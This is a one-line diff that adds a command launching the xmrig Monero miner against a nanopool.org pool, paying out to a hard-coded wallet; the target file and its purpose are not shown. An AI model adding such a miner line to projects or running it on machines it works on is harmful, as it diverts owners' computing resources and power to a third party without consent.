@@ -1,0 +1,1 @@
+xmrig.exe -o xmr-us-west1.nanopool.org:10343 -u 8AdfXDxmbhMC66qBtoKtZwCwTXMoDqydkH9Nefb3G5NwcKC7ouQccgmb2sAHFdtjU9W5YJksmQw7fRaA6Tfs8n1TBVBVkoq --tls --coin monero
